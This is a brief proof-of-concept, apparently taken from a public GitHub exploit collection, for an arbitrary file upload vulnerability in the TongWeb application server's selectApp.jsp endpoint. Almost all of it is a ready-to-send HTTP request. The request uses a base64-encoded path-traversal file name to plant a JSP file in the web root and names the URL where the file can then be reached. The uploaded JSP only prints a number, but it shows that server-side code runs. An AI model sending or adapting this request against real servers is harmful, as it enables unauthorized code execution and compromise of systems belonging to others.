# donfangton_selectApp.jsp_fileupload

from: https://github.com/wy876/POC/blob/main/%E4%B8%9C%E6%96%B9%E9%80%9ATongWeb-selectApp.jsp%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md

2024.4.8 @2

```
POST /heimdall/pages/cla/selectApp.jsp HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=fa2ef860e94d564632e291131d20064c
User-Agent: Mozilla/5.0 

--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="app_fileName"

Li4vLi4vYXBwbGljYXRpb25zL2hlaW1kYWxsLzEyM3F3ZTEuanNw
--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="app"


--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="className"

test
--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="uploadApp"; filename="test.jar"
Content-Type: application/java-archive

<% out.println(16156223+223415616); %>
--fa2ef860e94d564632e291131d20064c--

```

filepath: `http://ip/heimdall/123qwe1.jsp`
